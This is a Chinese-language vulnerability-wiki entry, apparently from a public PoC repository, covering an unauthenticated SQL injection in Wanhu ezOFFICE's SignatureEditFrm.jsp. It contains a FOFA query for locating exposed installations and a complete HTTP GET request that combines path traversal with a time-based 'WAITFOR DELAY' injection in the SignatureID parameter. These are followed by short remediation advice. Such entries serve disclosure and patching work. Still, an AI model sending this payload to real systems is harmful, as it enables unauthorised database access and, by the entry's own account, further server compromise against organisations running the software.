---

source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 万户 ezOFFICE SignatureEditFrm.jsp SQL注入漏洞

# 漏洞描述

万户 ezOFFICE SignatureEditFrm.jsp接口存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

# 影响版本

万户网络-ezOFFICE

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="万户网络-ezOFFICE"

POC/EXP：

GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:7%27-- HTTP/1.1
Host: 127.0.0.1:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20241030105136802](./.resource/万户ezOFFICESignatureEditFrm.jspSQL注入漏洞/media/image-20241030105136802.png)


![image-20241030105212013](./.resource/万户ezOFFICESignatureEditFrm.jspSQL注入漏洞/media/image-20241030105212013.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
